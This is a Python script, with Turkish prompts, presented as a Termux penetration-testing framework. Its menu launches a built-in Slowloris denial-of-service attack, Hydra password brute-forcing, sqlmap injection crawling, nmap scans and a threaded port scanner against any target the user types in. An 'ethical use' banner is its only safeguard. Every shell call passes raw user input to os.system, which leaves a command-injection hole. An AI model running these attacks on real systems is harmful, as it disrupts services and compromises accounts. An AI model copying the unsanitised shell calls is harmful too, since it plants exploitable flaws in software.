#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SPECTER-ALLIANCE PENTEST FRAMEWORK
# by:SPECTER(:AdMiN

import os
import sys
import time
import socket
import requests
import whois
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)  # Renkleri aktif et

# Banner
def show_banner():
    print(Fore.MAGENTA + """
  ____  _____ ____ _____ _____ ____ _____ _   _ _____ 
 / ___|| ____|  _ \_   _| ____/ ___|_   _| | | | ____|
 \___ \|  _| | |_) || | |  _|| |     | | | |_| |  _|  
  ___) | |___|  __/ | | | |__| |___  | | |  _  | |___ 
 |____/|_____|_|    |_| |_____\____| |_| |_| |_|_____|
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + "          [Termux Pentest Framework - Ethical Use Only]")
    print(Fore.CYAN + "             by:SPECTER(:AdMiN" + Style.RESET_ALL)
    print(Fore.RED + "-" * 60 + Style.RESET_ALL)

# NMAP Tarama
def nmap_scan(target):
    print(Fore.GREEN + f"\n[+] NMAP Taraması Başlatıldı: {target}" + Style.RESET_ALL)
    os.system(f"nmap -sV -A -T4 {target}")

# SQL Injection Test
def sql_injection(target):
    print(Fore.GREEN + f"\n[+] SQL Injection Testi: {target}" + Style.RESET_ALL)
    os.system(f"sqlmap -u {target} --batch --crawl=2 --level=3")

# Slowloris (etik kullanım!)
def slowloris(target, port=80, sockets_count=200):
    print(Fore.RED + f"\n[!] Slowloris Başlatıldı: {target}:{port}" + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] DURDURMAK İÇİN: CTRL+C" + Style.RESET_ALL)
    sockets = []
    try:
        for _ in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(f"GET /?{time.time()} HTTP/1.1\r\n".encode())
                s.send("User-Agent: Specter-Pentest\r\n".encode())
                s.send("Accept-language: en-US\r\n".encode())
                sockets.append(s)
            except:
                pass
        while True:
            time.sleep(15)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Durduruldu!" + Style.RESET_ALL)
        for s in sockets:
            s.close()

# Hydra Brute-Force
def hydra_brute(target, protocol, username, wordlist):
    print(Fore.GREEN + f"\n[+] Hydra Brute-Force: {target}" + Style.RESET_ALL)
    os.system(f"hydra -l {username} -P {wordlist} {target} {protocol}")

# WHOIS Sorgusu
def whois_lookup(target):
    try:
        print(Fore.GREEN + f"\n[+] WHOIS Sorgulanıyor: {target}" + Style.RESET_ALL)
        result = whois.whois(target)
        print(result)
    except Exception as e:
        print(Fore.RED + f"[!] WHOIS sorgusunda hata: {e}" + Style.RESET_ALL)

# HTTP Header Bilgileri
def header_info(target):
    try:
        print(Fore.GREEN + f"\n[+] HTTP Header Bilgileri: {target}" + Style.RESET_ALL)
        headers = requests.get(target).headers
        for key, value in headers.items():
            print(Fore.CYAN + f"{key}: {value}")
    except Exception as e:
        print(Fore.RED + f"[!] Header çekilemedi: {e}" + Style.RESET_ALL)

# Subdomain Scanner (Statik liste)
def subdomain_scan(domain):
    subdomains = ["www", "mail", "ftp", "admin", "test", "dev"]
    print(Fore.GREEN + f"\n[+] Subdomain Taraması: {domain}" + Style.RESET_ALL)
    for sub in subdomains:
        url = f"http://{sub}.{domain}"
        try:
            r = requests.get(url, timeout=3)
            print(Fore.CYAN + f"[✓] Aktif: {url}")
        except:
            pass

# Port Taraması (Threaded)
def port_scan(target, ports=range(1, 1025)):
    print(Fore.GREEN + f"\n[+] Port Taraması Başlatıldı: {target}" + Style.RESET_ALL)
    open_ports = []

    def scan_port(port):
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            sock.connect((target, port))
            open_ports.append(port)
            print(Fore.CYAN + f"[✓] Port {port} açık")
            sock.close()
        except:
            pass

    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(scan_port, ports)

    if not open_ports:
        print(Fore.RED + "[!] Açık port bulunamadı." + Style.RESET_ALL)

# Ana Menü
def main():
    show_banner()
    while True:
        print(Fore.CYAN + """
        1) NMAP PORT TARAMA
        2) SQL INJECTION TEST
        3) SLOWLORIS (DDOS TEST - YASAL KULLAN)
        4) HYDRA BRUTE-FORCE
        5) WHOIS SORGUSU
        6) HTTP HEADER BİLGİLERİ
        7) SUBDOMAIN TARAMASI
        8) PORT SCANNER (1-1024)
        9) ÇIKIŞ
        """ + Style.RESET_ALL)
        choice = input(Fore.YELLOW + "Seçim yapın [1-9]: " + Style.RESET_ALL)

        if choice == "1":
            target = input("Hedef IP/URL: ")
            nmap_scan(target)
        elif choice == "2":
            target = input("Hedef URL (Ör: http://testphp.vulnweb.com): ")
            sql_injection(target)
        elif choice == "3":
            target = input("Hedef IP (SADECE İZİNLİ SİSTEMLERDE!): ")
            port = input("Port (Varsayılan: 80): ") or "80"
            slowloris(target, int(port))
        elif choice == "4":
            target = input("Hedef IP: ")
            protocol = input("Protokol (ssh, ftp, http-post-form): ")
            username = input("Kullanıcı adı: ")
            wordlist = input("Wordlist dosyası (Ör: wordlist.txt): ")
            hydra_brute(target, protocol, username, wordlist)
        elif choice == "5":
            target = input("Domain/IP: ")
            whois_lookup(target)
        elif choice == "6":
            target = input("URL (http://...): ")
            header_info(target)
        elif choice == "7":
            domain = input("Domain (ör: site.com): ")
            subdomain_scan(domain)
        elif choice == "8":
            target = input("Hedef IP/Domain: ")
            port_scan(target)
        elif choice == "9":
            print(Fore.RED + "\n[+] Çıkış yapılıyor..." + Style.RESET_ALL)
            sys.exit(0)
        else:
            print(Fore.RED + "\n[!] Geçersiz seçim!" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
